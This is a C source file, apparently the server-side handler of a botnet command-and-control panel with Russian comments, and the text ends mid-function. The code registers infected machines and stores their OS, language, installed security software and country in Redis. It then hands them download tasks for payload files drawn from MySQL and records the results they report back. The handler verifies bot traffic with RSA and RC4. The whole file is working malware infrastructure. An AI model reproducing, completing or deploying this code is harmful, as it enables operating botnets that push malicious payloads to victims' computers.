#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <mysql/mysql.h>
#include <mysql/mysqld_error.h>

#include "../../shared_code/platform.h"
#include "../../shared_code/types.h"
#include "../../shared_code/config.h"
#include "../../shared_code/native.h"

#include "../../shared_code/base64.h"
#include "../../shared_code/timing.h"
#include "../../shared_code/crc64.h"
#include "../../shared_code/salsa20.h"

#include "../../shared_code/bignum.h"
#include "../../shared_code/bn_mul.h"
#include "../../shared_code/rsa.h"
#include "../../shared_code/arc4.h"

#include "redis_config.h"

#include "../../shared_code/bignum.c"

#define USE_RSA_PRIVATE_DECRYPT_HASH
#include "../../shared_code/rsa.c"
#include "../../shared_code/arc4.c"

#define MAJOR_HANDLER_VERSION 0
#define MINOR_HANDLER_VERSION 78

#define RSA_SIGN_SIZE 128
#define BOTID_SIZE 64
#define POST_BODY_MIN_SIZE 128 + 16

#define NRT_SYSTEM_INFO   1
#define NRT_TASKS_REQUEST 2
#define NRT_TASKS_CONFIRM 3
#define NRT_TASKS_REPORT  4

#define MYSQL_DB 1
#define Z0wX_DB_TYPE MYSQL_DB

#define BYTES_PER_TASK 390
#define BYTES_PER_REPORT 10
#define BYTES_PER_MATRIX (2 * sizeof(uint32_t) + 4 * sizeof(char*))

#include "platform.h"
#include "errors.h"
#include "globalconfig.h"
#include "logger.h"
#include "geoip.h"
#include "fcgiw.h"
#include "db.h"
#include "mempool.h"
#include "configuration.h"

static memory_pool_t gPostBodyPool;
static memory_pool_t gConfigurationPool;
static memory_pool_t gFcgiReqPool;
static memory_pool_t gShaHashPool;
static memory_pool_t gQueryPool;
static memory_pool_t gTasksPool;
static memory_pool_t gBotInfoPool;
static memory_pool_t gTasksReportPool;
static uint8_t gPrivRSAKey[9 * 128] = {'R', 'S', 'A', ' ', 'P', 'R', 'I', 'V', 'A', 'T', 'E', ' ', 'K', 'E', 'Y', '!'};

const configuration_t gConfiguration = {{'<', 'c', 'o', 'n', 'f', 'i', 'g', '>'}};

global_config_t gGlobalConfig;
rsa_context_t gRsaContext;

void* handleConfigParameter(char* keyName, int* pValueType)
{
	void* pVal = NULL;

	if (gGlobalConfig.socketPath == 0 && strcmp(keyName, "sockfile") == 0) {
		pVal = (void*)&gGlobalConfig.socketPath; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.syslogIdent == 0 && strcmp(keyName, "syslog_ident") == 0) {
		pVal = (void*)&gGlobalConfig.syslogIdent; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.filesPathPrefix == 0 && strcmp(keyName, "files_path_prefix") == 0) {
		pVal = (void*)&gGlobalConfig.filesPathPrefix; *pValueType = TYPE_STRING_PATH;
	}
	else if (strcmp(keyName, "log_warnings") == 0) {
		pVal = (void*)&gGlobalConfig.logWarnings; *pValueType = TYPE_UINT16;
	}
	else if (strcmp(keyName, "log_infos") == 0) {
		pVal = (void*)&gGlobalConfig.logInfos; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.dbHost == 0 && strcmp(keyName, "db_host") == 0) {
		pVal = (void*)&gGlobalConfig.dbHost; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "db_port") == 0) {
		pVal = (void*)&gGlobalConfig.dbPort; *pValueType = TYPE_UINT16;
	}
	else if (gGlobalConfig.dbUser == 0 && strcmp(keyName, "db_user") == 0) {
		pVal = (void*)&gGlobalConfig.dbUser; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.dbPassword == 0 && strcmp(keyName, "db_pwd") == 0) {
		pVal = (void*)&gGlobalConfig.dbPassword; *pValueType = TYPE_STRING;
	}
	else if (gGlobalConfig.dbName == 0 && strcmp(keyName, "db_name") == 0) {
		pVal = (void*)&gGlobalConfig.dbName; *pValueType = TYPE_STRING;
	}
	else if (strcmp(keyName, "min_pool_size") == 0) {
		pVal = (void*)&gGlobalConfig.minPoolSize; *pValueType = TYPE_SIZET;
	}
	else if (strcmp(keyName, "max_pool_size") == 0) {
		pVal = (void*)&gGlobalConfig.maxPoolSize; *pValueType = TYPE_SIZET;
	}
	else if (strcmp(keyName, "http_post_body_size") == 0) {
		pVal = (void*)&gGlobalConfig.httpPostBodySize; *pValueType = TYPE_SIZET;
	}
	else if (strcmp(keyName, "tasks_per_connection") == 0) {
		pVal = (void*)&gGlobalConfig.tasksPerConn; *pValueType = TYPE_UINT16;
	}
	else if(gGlobalConfig.geoipDataFile == 0 && strcmp(keyName, "geoip_data_file") == 0) {
		pVal = (void*)&gGlobalConfig.geoipDataFile; *pValueType = TYPE_STRING;
	}
	
	return pVal;
}

static pthread_mutex_t gTsMutex = PTHREAD_MUTEX_INITIALIZER;

// Алгоритм обновления статистики клиента
// 1. Получаем запись из clients_stat для указанного id-клиента. Если результат нулевой, то получаем Geo информацию об IP и добавляем запись.
// 2. Иначе, проверяем соответствие текущего ip с тем, что в базе, если они совпадают, то обновляем только поле tm
// 3. Иначе, обновляем поля ip, country_code, city, tm.
int logic_update_bot_statistics(redisContext* redisCtx, int isNewBot, uint64_t insideId, const char* uniqid, uint32_t affId, uint16_t subId, uint8_t ver, uint16_t osVer, uint16_t osLang, uint64_t hips, uint32_t ip, char* countryCode, char* query)
{
	redisReply* redisReply = NULL;
	uint32_t currTimestamp;
	uint32_t ts, prevTs = 0;

	currTimestamp = (uint32_t)time(NULL);
	ts = currTimestamp / TS_STEP;

//	logger_info("%llu:%u:%u:%u:%u:%u:%.7s\n", insideId, affId, subId, ver, osVer, osLang, countryCode);

	snprintf(query, 1024, "LINDEX ltss -1");
	logger_info(query);
	pthread_mutex_lock(&gTsMutex);
	redisReply = redisCommand(redisCtx, query);
	if (redisReply == NULL) {
		pthread_mutex_unlock(&gTsMutex);
		return ERR_REDIS;
	}
	if (redisReply->type == REDIS_REPLY_NIL || (redisReply->type == REDIS_REPLY_STRING && (prevTs = (uint32_t)atoll(redisReply->str)) < ts)) {
		freeReplyObject(redisReply);
		snprintf(query, 1024, "RPUSH ltss %u", ts);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL) {
			pthread_mutex_unlock(&gTsMutex);
			return ERR_REDIS;
		}
	}
	pthread_mutex_unlock(&gTsMutex);
	freeReplyObject(redisReply);

	if (isNewBot) {
		snprintf(query, 1024, "RPUSH bh:%u %llu:%u:%.64s:%u:%u:%u:%u:%u:%u:%u:%llu:%.2s:%u", ts, insideId, isNewBot, uniqid, currTimestamp, currTimestamp, affId, subId, ver, osVer, osLang, hips, countryCode, ip);
	}
	else {
		snprintf(query, 1024, "HGET dtf %llu", insideId);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL)
			return ERR_REDIS;
		
		snprintf(query, 1024, "RPUSH bh:%u %llu:%u:%.64s:%u:%u:%u:%u:%u:%u:%u:%llu:%.2s:%u", ts, insideId, isNewBot, uniqid, (uint32_t)atoll(redisReply->str), currTimestamp, affId, subId, ver, osVer, osLang, hips, countryCode, ip);
		freeReplyObject(redisReply);
	}

	
	logger_info(query);
	redisReply = redisCommand(redisCtx, query);
	if (redisReply == NULL) {
		return ERR_REDIS;
	}
	freeReplyObject(redisReply);
	return ERR_OK;
}

int logic_get_bot_info(redisContext* redisCtx, char* query, uint64_t insideId, uint8_t* pVer, uint32_t* pAffId, uint16_t* pSubId, uint16_t* pOsVer, uint16_t* pOsLang, uint64_t* pHips, char* cc)
{
	int err = ERR_REDIS;
	redisReply* rrAffId;
	redisReply* rrSubId;
	redisReply* rrVer;
	redisReply* rrOsVer;
	redisReply* rrOsLang;
	redisReply* rrHips;
	redisReply* rrCC;

	do {
		snprintf(query, 1024, "HGET affids %llu", insideId);
		logger_info(query);
		rrAffId = redisCommand(redisCtx, query);
		if (rrAffId == NULL) {
			break;
		}
		if (rrAffId->type != REDIS_REPLY_NIL) {
			*pAffId = (uint32_t)strtoull(rrAffId->str, NULL, 10);
		}
		freeReplyObject(rrAffId);
		
		snprintf(query, 1024, "HGET subids %llu", insideId);
		logger_info(query);
		rrSubId = redisCommand(redisCtx, query);
		if (rrSubId == NULL) {
			break;
		}
		if (rrSubId->type != REDIS_REPLY_NIL) {
			*pSubId = (uint16_t)atoi(rrSubId->str);
		}
		freeReplyObject(rrSubId);
		
		snprintf(query, 1024, "HGET vers %llu", insideId);
		logger_info(query);
		rrVer = redisCommand(redisCtx, query);
		if (rrVer == NULL) {
			break;
		}
		if (rrVer->type != REDIS_REPLY_NIL) {
			*pVer = (uint8_t)atoi(rrVer->str);
		}
		freeReplyObject(rrVer);

		snprintf(query, 1024, "HGET osvers %llu", insideId);
		logger_info(query);
		rrOsVer = redisCommand(redisCtx, query);
		if (rrOsVer == NULL) {
			break;
		}
		if (rrOsVer->type != REDIS_REPLY_NIL) {
			*pOsVer = (uint16_t)atoi(rrOsVer->str);
		}
		freeReplyObject(rrOsVer);

		snprintf(query, 1024, "HGET oslngs %llu", insideId);
		logger_info(query);
		rrOsLang = redisCommand(redisCtx, query);
		if (rrOsLang == NULL) {
			break;
		}
		if (rrOsLang->type != REDIS_REPLY_NIL) {
			*pOsLang = (uint16_t)atoi(rrOsLang->str);
		}
		freeReplyObject(rrOsLang);

		snprintf(query, 1024, "HGET hipses %llu", insideId);
		logger_info(query);
		rrHips = redisCommand(redisCtx, query);
		if (rrHips == NULL) {
			break;
		}
		if (rrHips->type != REDIS_REPLY_NIL) {
			*pHips = strtoull(rrHips->str, NULL, 10);
		}
		freeReplyObject(rrHips);

		snprintf(query, 1024, "HGET geos %llu", insideId);
		logger_info(query);
		rrCC = redisCommand(redisCtx, query);
		if (rrCC == NULL) {
			break;
		}
		if (rrCC->type != REDIS_REPLY_NIL) {
			strncpy(cc, rrCC->str, 2);	
		}		
		freeReplyObject(rrCC);

		err = ERR_OK;
	} while (0);

	return err;
}

int logic_update_bot_info(const char* const id, uint32_t ip, uint8_t* data, uint16_t dataLen, uint8_t** pOutData, uint32_t* pOutSize)
{
#define REAL_DATA_SIZE 21
	int err = ERR_REDIS;
	uint8_t ver;
//	uint16_t clientId;
	uint16_t subId;
	uint32_t affId;
	uint16_t osVer;
	uint16_t osLang;
	uint64_t hips;
	char cc[3];
	char* query;
	int botExists = 0;
	long long insideId;
	char* countryCode;
	char* sIp;
	struct in_addr inAddr;
	redisContext* redisCtx = NULL;
	redisReply* redisReply = NULL;
	struct timeval timeout = {3, 0}; // 3 секунды
	USE_PERF;

	if (dataLen != REAL_DATA_SIZE) {
		return ERR_INVALID_DATA;
	}

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	redisCtx = redisConnectWithTimeout((char*)"127.0.0.1", 6379, timeout);
	if (redisCtx->err) {
		return ERR_REDIS_CONNECT;
	}

	ver = *data;
//	clientId = *(uint16_t*)(data + 1);
	subId = *(uint16_t*)(data + 3);
	affId = *(uint32_t*)(data + 5);
	osVer = *(uint16_t*)(data + 9);
	osLang = *(uint16_t*)(data + 11);
	hips = *(uint64_t*)(data + 13);

	do {
		snprintf(query, 1024, "ZSCORE zids %.64s", id);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL) {
			break;
		}
		if (redisReply->type != REDIS_REPLY_NIL) {
			botExists = 1;
			insideId = atoll(redisReply->str);	
		}
		freeReplyObject(redisReply);
		
		inAddr.s_addr = ip;
		sIp = inet_ntoa(inAddr);
		countryCode = (char*)geoip_get_country(sIp);
		if (countryCode == NULL) {
			countryCode = "UU";
		}

		if (!botExists) {
			snprintf(query, 1024, "INCR bot_next_id");
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			insideId = redisReply->integer;
			freeReplyObject(redisReply);

			// Создаём ключ по которому сможем получать внутренний inside_id по внешнему.
			snprintf(query, 1024, "ZADD zids %llu %.64s", insideId, id);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET dtf %llu %u", insideId, (uint32_t)time(NULL));
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET affids %llu %u", insideId, affId);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET subids %llu %u", insideId, subId);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET vers %llu %u", insideId, ver);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET osvers %llu %u", insideId, osVer);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET oslngs %llu %u", insideId, osLang);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET hipses %llu %llu", insideId, hips);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			snprintf(query, 1024, "HSET geos %llu %.7s", insideId, countryCode);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			}
			freeReplyObject(redisReply);

			logic_update_bot_statistics(redisCtx, !botExists, insideId, id, affId, subId, ver, osVer, osLang, hips, ip, countryCode, query);
		}
		else {
			uint8_t origVer;
			uint16_t origOsVer;
			uint16_t origOsLang;
			uint64_t origHips;
			
			if (logic_get_bot_info(redisCtx, query, insideId, &origVer, &affId, &subId, &origOsVer, &origOsLang, &origHips, (char*)cc) == ERR_OK) {
				if (origVer != ver) {
					snprintf(query, 1024, "HSET vers %llu %u", insideId, ver);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
					if (redisReply == NULL) {
						break;
					}
					freeReplyObject(redisReply);
				}
				
				if (origOsVer != osVer) {
					snprintf(query, 1024, "HSET osvers %llu %u", insideId, osVer);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
					if (redisReply == NULL) {
						break;
					}
					freeReplyObject(redisReply);
				}
				
				if (origOsLang != osLang) {
					snprintf(query, 1024, "HSET oslngs %llu %u", insideId, osLang);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
					if (redisReply == NULL) {
						break;
					}
					freeReplyObject(redisReply);
				}

				if (origHips != hips) {
					snprintf(query, 1024, "HSET hipses %llu %llu", insideId, hips);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
					if (redisReply == NULL) {
						break;
					}
					freeReplyObject(redisReply);
				}
				
				if (*(uint16_t*)countryCode != *(uint16_t*)cc) {
					snprintf(query, 1024, "HSET geos %llu %.7s", insideId, countryCode);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
					if (redisReply == NULL) {
						break;
					}
					freeReplyObject(redisReply);
				}				
				
				logic_update_bot_statistics(redisCtx, !botExists, insideId, id, affId, subId, ver, osVer, osLang, hips, ip, countryCode, query);
			}
		}

		err = ERR_OK;
	} while (0);

	redisFree(redisCtx);

	if (err  == ERR_OK) {
		uint8_t* data;
		data = mempool_get(&gBotInfoPool);
		*((uint32_t*)data) = ip;
		*(uint16_t*)(data + sizeof(uint32_t)) = *(uint16_t*)countryCode;
		*pOutData = data;
		*pOutSize = sizeof(uint32_t) + 2; // IP + Country code
	}
	
	mempool_release(&gQueryPool, query);

	return err;
}

int logic_check_tasks_for_bot(const char* const id, uint32_t ip, char* httpHost, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	MYSQL* mysql;
	int err = ERR_MYSQL;
	int mysqlErr;
	char* query;
	MYSQL_RES* mysqlResult = NULL;
	MYSQL_ROW mysqlRow;
	int row = 0, numRows;
	char* taskList = NULL;
	char *taskListPtr = NULL, *mtxPtr = NULL;
	uint64_t insideId;
	uint8_t ver;
	uint16_t subId;
	uint32_t affId;
	uint16_t osVer;
	uint16_t osLang;
	uint64_t hips;
	char cc[3];
	uint32_t tGroupId = 0, tMinAccepted, neededRow, realTaskCount = 0;
	redisContext* redisCtx = NULL;
	redisReply* redisReply = NULL;
	struct timeval timeout = {3, 0}; // 3 секунды
	uint32_t currTimestamp;
	USE_PERF;

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	mysql = db_get_mysql();

	if (mysql == NULL) {
		mempool_release(&gQueryPool, query);
		return ERR_MEMPOOL;
	}

	redisCtx = redisConnectWithTimeout((char*)"127.0.0.1", 6379, timeout);
	if (redisCtx->err) {
		return ERR_REDIS_CONNECT;
	}

	do {
		snprintf(query, 1024, "ZSCORE zids %.64s", id);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL) {
			err = ERR_REDIS;
			break;
		}
		if (redisReply->type == REDIS_REPLY_NIL) {
			err = ERR_BOT_NOT_EXISTS;
			break;
		}
		insideId = strtoull(redisReply->str, NULL, 10);
		freeReplyObject(redisReply);

		if (logic_get_bot_info(redisCtx, query, insideId, &ver, &affId, &subId, &osVer, &osLang, &hips, (char*)cc) != ERR_OK) {
			err = ERR_INVALID_DATA;
			break;
		}

		// Получаем задания.
		snprintf(query, 1024,
			"SELECT t.id, t.attempts, t.atimeout, f.uri, t.group_id, t.accepted FROM tasks t, files f, filters ft, tasks_filters tft WHERE "
			"(t.capacity IS NULL OR t.capacity > t.accepted) AND "
			"(t.paused != 1) AND "
			"(t.group_id NOT IN (SELECT task_group_id from bots_task_groups WHERE bot_id = %llu)) AND "
			"(t.ftyp_id = ft.ftyp_id) AND "
			"(t.file_id = f.id) AND "
			"(t.id = tft.task_id) AND "
			"(ft.flt_group_id = tft.flt_id) AND "
			"( "
			" ( "
			"  (t.ftyp_id = 1) AND "
			"  (ft.aff_id IS NULL OR ft.aff_id = %u) AND "
			"  (ft.sub_id IS NULL OR ft.sub_id = %u) AND "
			"  (ft.bot_ver IS NULL OR ft.bot_ver = %u) AND "
			"  (ft.os_ver IS NULL OR ft.os_ver = %u) AND "
			"  (ft.os_lang IS NULL OR ft.os_lang = %u) AND "
			"  (ft.cc IS NULL OR ft.cc = '%.2s') "
			" ) OR "
			" ( "
			"  (t.ftyp_id = 3) AND "
			"  (ft.ip = %u) "
			" ) OR "
			" ( "
			"  (t.ftyp_id = 2) AND "
			"  (ft.bot_id = %llu) "
			" ) "
			") "
			"ORDER BY t.group_id LIMIT %u",
		insideId, affId, subId, ver, osVer, osLang, cc, ip, insideId, gGlobalConfig.tasksPerConn);

		logger_info(query);

		BEGIN_PERF;	
		mysqlErr = db_query(mysql, query);
		END_PERF(query);
		if (mysqlErr != 0) {
			break;
		}

		mysqlResult = mysql_store_result(mysql);
		if (mysqlResult == NULL) {
			break;
		}

		numRows = mysql_num_rows(mysqlResult);

		if (numRows <= 0) {
			logger_info("No tasks for %.64s", id);
			err = ERR_OK;
			break;
		}
		
		taskList = mempool_get(&gTasksPool);
		if (taskList == NULL) {
			err = ERR_MEMPOOL;
			break;
		}

		taskListPtr = (char*)(taskList + gGlobalConfig.tasksPerConn * BYTES_PER_MATRIX);

		memset(taskListPtr, 0, gTasksPool.blockSize - (gGlobalConfig.tasksPerConn * BYTES_PER_MATRIX));
		
		// Формируем матрицу данных заданий.
		while ((mysqlRow = mysql_fetch_row(mysqlResult))) {
			uint32_t* pUintValues = (uint32_t*)(taskList + row * (2 * sizeof(uint32_t) + 4 * sizeof(char*)));
			char** pTaskData = (char**)((char*)pUintValues + 2 * sizeof(uint32_t));
			*pUintValues = (uint32_t)atoll(mysqlRow[4]);
			*(++pUintValues) = (uint32_t)atoll(mysqlRow[5]);
			*pTaskData = mysqlRow[0];
			*(++pTaskData) = mysqlRow[1];
			*(++pTaskData) = mysqlRow[2];
			*(++pTaskData) = mysqlRow[3];
			++row;
		}

		currTimestamp = (uint32_t)time(NULL);
		
		// Делаем выборку заданий для каждой группы с минимальным полем accepted.
		for (row = 0; row < numRows; ++row) {
			uint32_t* pTaskData = (uint32_t*)(taskList + row * (2 * sizeof(uint32_t) + 4 * sizeof(char*)));
			uint32_t groupId = *pTaskData++;
			uint32_t accepted = *pTaskData++;
			
			if (tGroupId != groupId) {
final_task:
				if (tGroupId != 0) {
					char** pTaskInfo = (char**)(taskList + neededRow * (2 * sizeof(uint32_t) + 4 * sizeof(char*)) + 2 * sizeof(uint32_t));
					snprintf(query, 1024, "INSERT INTO bots_tasks(bot_id, task_id, tres_id, update_dt) VALUES(%llu, %.10s, 0, %u)", insideId, *pTaskInfo, currTimestamp);
					logger_info(query);

					BEGIN_PERF;
					mysqlErr = db_query(mysql, query);
					END_PERF(query);
					if (mysqlErr == 0) {
						snprintf(query, 1024, "INSERT INTO bots_task_groups(bot_id, task_group_id) VALUES(%llu, %u)", insideId, tGroupId);
						logger_info(query);

						BEGIN_PERF;
						mysqlErr = db_query(mysql, query);
						END_PERF(query);
						if (mysqlErr == 0) {
							// Задания упаковываются в следующий список: id1|attempts1|atimeout1|url1||id2|attempts2|atimeout2|url2||...
							strncat(taskListPtr, *pTaskInfo++, 10);
							strncat(taskListPtr, "|", 1);
							strncat(taskListPtr, *pTaskInfo++, 5);
							strncat(taskListPtr, "|", 1);
							strncat(taskListPtr, *pTaskInfo++, 5);
							strncat(taskListPtr, "|", 1);
							strncat(taskListPtr, httpHost, 255);
							strncat(taskListPtr, "/", 1);
							strncat(taskListPtr, gGlobalConfig.filesPathPrefix, 255);
							strncat(taskListPtr, *pTaskInfo++, 255);
							strncat(taskListPtr, "||", 2);
							++realTaskCount;
						}
					}
				}
				tMinAccepted = 0xffffffff;
				tGroupId = groupId;
			}
			
			if (tMinAccepted > accepted) {
				tMinAccepted = accepted;
				neededRow = row;
			}
			
			if ((row + 1) == numRows) {
				++row;
				goto final_task;
			}
		}

		base64_encode((uint8_t*)taskListPtr, strlen(taskListPtr), taskList + gGlobalConfig.tasksPerConn * (BYTES_PER_TASK + BYTES_PER_MATRIX));
		*pTaskList = taskList;
		
		logger_info("%d task(s) for %.64s", realTaskCount, id);
		
		err = ERR_OK;
	} while (0);

	if (err == ERR_OK) {
		logic_update_bot_statistics(redisCtx, 0, insideId, id, affId, subId, ver, osVer, osLang, hips, ip, cc, query);
	}
	else {
		if (taskList != NULL)
			mempool_release(&gTasksPool, taskList);
	}

	if (mysqlResult != NULL)
		mysql_free_result(mysqlResult);

	redisFree(redisCtx);
	
	db_release_mysql(mysql);
	mempool_release(&gQueryPool, query);
	return err;
}

int logic_report_tasks_for_bot(const char* const id, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	int err = ERR_MEMPOOL;
	MYSQL* mysql;
	uint8_t tres_id;
	uint8_t* taskList;
	char* query;
	uint32_t cnt = 0;
	uint16_t i;
	int mysqlErr;
	long long insideId;
	redisContext* redisCtx = NULL;
	redisReply* redisReply = NULL;
	struct timeval timeout = {3, 0}; // 3 секунды
	uint32_t currTimestamp;
	USE_PERF;

	if (dataLen > 0 && dataLen % 5 != 0)
		return ERR_INVALID_DATA;

	query = mempool_get(&gQueryPool);
	if (query == NULL) {
		return ERR_MEMPOOL;
	}

	mysql = db_get_mysql();

	if (mysql == NULL) {
		mempool_release(&gQueryPool, query);
		return ERR_MEMPOOL;
	}

	redisCtx = redisConnectWithTimeout((char*)"127.0.0.1", 6379, timeout);
	if (redisCtx->err) {
		return ERR_REDIS_CONNECT;
	}

	currTimestamp = (uint32_t)time(NULL);

	do {
		snprintf(query, 1024, "ZSCORE zids %.64s", id);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL) {
			err = ERR_REDIS;
			break;
		}
		if (redisReply->type == REDIS_REPLY_NIL) {
			err = ERR_BOT_NOT_EXISTS;
			break;
		}
		insideId = atoll(redisReply->str);
		freeReplyObject(redisReply);

		taskList = mempool_get(&gTasksReportPool);
		if (taskList == NULL) {
			break;
		}

		memset(taskList + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT, 0, gTasksPool.blockSize - gGlobalConfig.tasksPerConn * BYTES_PER_REPORT);

		for (i = 0; i < dataLen; i += 5) {
			tres_id = data[i + 4];
			snprintf(query, 1024, "UPDATE bots_tasks SET tres_id=%u,update_dt=%u WHERE bot_id=%llu AND task_id=%u", tres_id == 0 ? 1 : tres_id, currTimestamp, insideId, *(uint32_t*)&data[i]);
			logger_info(query);

			BEGIN_PERF;
			mysqlErr = db_query(mysql, query);
			END_PERF(query);
			if (mysqlErr == 0) {
				memcpy(taskList + cnt, data + i, 5);
				cnt += 5;
			}
		}

		base64_encode(taskList, cnt, taskList + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT);
		*pTaskList = taskList;
				
		err = ERR_OK;
	} while (0);

	if (redisCtx != NULL) {
		redisFree(redisCtx);
	}
	
	db_release_mysql(mysql);
	mempool_release(&gQueryPool, query);

	return err;
}

int logic_verify_bot_data(uint8_t* botData, int dataLen, pconfiguration_t* ppConfiguration)
{
	int err = ERR_MEMPOOL;
	uint8_t* shaHash = NULL;
	int hashSize = 0;
	pconfiguration_t pConfiguration = NULL;
	arc4_context_t arc4;
	uint8_t crc[8];
	USE_PERF;
	
	BEGIN_PERF;

	do {
		shaHash = mempool_get(&gShaHashPool);
		if (shaHash == NULL) {
			logger_error("logic_parse_and_decode_request: Can't obtain memory from gShaHashPool");
			break;
		}

		// Дешифруем SHA-1 дайджест.
		err = rsa_private_decrypt_hash(&gRsaContext, botData, shaHash, &hashSize);
		if (err != ERR_OK || hashSize != 20) {
			logger_error("logic_parse_and_decode_request: Invalid hash value in decrypted RSA buffer");
			break;
		}

		pConfiguration = mempool_get(&gConfigurationPool);
		if (pConfiguration == NULL) {
			err = ERR_MEMPOOL;
			logger_error("logic_parse_and_decode_request: Can't obtain memory from gConfigurationPool");
			break;
		}

		memset(&arc4, 0, sizeof(arc4_context_t));
		arc4_setup(&arc4, shaHash, 20);
		arc4_crypt(&arc4, sizeof(gConfiguration), (const uint8_t*)&gConfiguration, (uint8_t*)pConfiguration);
		
		crc64_computate((uint8_t*)pConfiguration, sizeof(configuration_t) - sizeof(gConfiguration.block_hash), (uint32_t*)crc);

		if (memcmp(pConfiguration->block_hash, crc, 8) != 0) {
			err = ERR_BAD_CRC;
			logger_error("logic_parse_and_decode_request: Incorrect crc in decrypted block");
			break;
		}

		*ppConfiguration = pConfiguration;

		err = ERR_OK;
	} while (0);

	if (err != ERR_OK) {
		if (pConfiguration != NULL) {
			mempool_release(&gConfigurationPool, pConfiguration);
		}
	}

	if (shaHash != NULL) {
		mempool_release(&gShaHashPool, shaHash);
	}

	END_PERF("Bot verification");

	return err;
}

int process_http_body(char* httpBody, int httpBodyLen, int* pNRT, uint32_t* pDataLen)
{
#define STR1_LEN 38
#define STR2_LEN 70
	const char* str1 = "Content-Disposition: form-data; name=\"";
	const char* str2 = "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: ";
	char *ptr = httpBody, *end = httpBody + httpBodyLen, *dataBuffer = httpBody + 2048;

	for ( ; ptr < end; ) {
		bool_t isBase64 = TRUE;

		// Проверяем префикс '--' для boundary
		if (*((uint16_t*)ptr) != 0x2D2D) {
			return ERR_BAD;
		}
		for (ptr += 2; *ptr != 0x2D && *ptr != 0x0D && ptr < end; ++ptr);
		if (ptr == end) {
			// Данные закончились раньше времени.
			return ERR_BAD;
		}

		if (*((uint16_t*)ptr) == 0x2D2D) {
			// Конец тела - цикл должен завершиться сам.
			break;
		}

		if (*((uint16_t*)ptr) != 0x0A0D) {
			return ERR_BAD;
		}

		ptr += 2;

		if (strncmp(ptr, str1, STR1_LEN)) {
			return ERR_BAD;
		}

		// Пропускаем имя блока.
		for (ptr += STR1_LEN; *ptr != '"' && ptr < end; ++ptr);
		if (ptr == end) {
			// Данные закончились раньше времени.
			return ERR_BAD;
		}

		++ptr;

		// Проверяем, обычный ли у нас текстовый блок.
		if (*((uint32_t*)ptr) == 0x0A0D0A0D) {
			// Обычный блок.
			ptr += 4;
		}
		else if (strncmp(ptr, "; filename=\"", 12) == 0) {
			// Пропускаем имя файла.
			for (ptr += 12; *ptr != '"' && ptr < end; ++ptr);
			if (ptr == end) {
				// Данные закончились раньше времени.
				return ERR_BAD;
			}
			
			if (strncmp(ptr, str2, STR2_LEN)) {
				return ERR_BAD;
			}

			ptr += STR2_LEN;

			if (strncmp(ptr, "binary\r\n\r\n", 10) == 0) {
				isBase64 = FALSE;
			}
			else if (strncmp(ptr, "base64\r\n\r\n", 10)) {
				return ERR_BAD;
			}

			ptr += 10;
		}
		else {
			return ERR_BAD;
		}

		if (isBase64) {
			char* base64Begin = ptr;

			for ( ; *((uint32_t*)ptr) != 0x2D2D0A0D && ptr < end; ++ptr);

			if (ptr == end) {
				// Данные закончились раньше времени.
				return ERR_BAD;
			}

			dataBuffer += base64_decode(base64Begin, ptr - base64Begin, dataBuffer);
		}
		else {
			for ( ; *((uint32_t*)ptr) != 0x2D2D0A0D && ptr < end; ++dataBuffer, ++ptr) {
				*dataBuffer = *ptr;
			}

			if (ptr == end) {
				// Данные закончились раньше времени.
				return ERR_BAD;
			}
		}
		
		ptr += 2;
	}

	{
		int i = 0, bitIndex = 0, ch;
	       int nrtApprox = 0, bitVal;

	       for (ptr = httpBody + 2; ptr[i] != 0x0D; ) {
       		ch = ptr[i++];

			bitVal = (ch >> bitIndex) & 1;
            		if (bitVal) {
